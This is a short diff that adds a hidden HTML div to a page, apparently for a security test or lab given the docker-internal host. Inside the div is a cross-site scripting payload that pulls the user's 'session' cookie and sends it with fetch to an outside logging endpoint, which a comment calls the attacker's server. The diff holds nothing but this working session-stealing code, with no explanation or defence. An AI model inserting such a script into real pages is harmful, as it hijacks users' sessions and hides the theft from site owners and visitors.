@@ -1,0 +1,11 @@
+<div id="hidden-xss" hidden>
+  <script>
+    // Get the value of the 'session' cookie
+    var sessionCookie = document.cookie.replace(/(?:(?:^|.*;\s*)session\s*\=\s*([^;]*).*$)|^.*$/, "$1");
+
+    // Send the 'session' cookie to the attacker's server
+    if(sessionCookie) {
+      fetch('http://host.docker.internal:4999/log?session=' + encodeURIComponent(sessionCookie));
+    }
+  </script>
+</div>
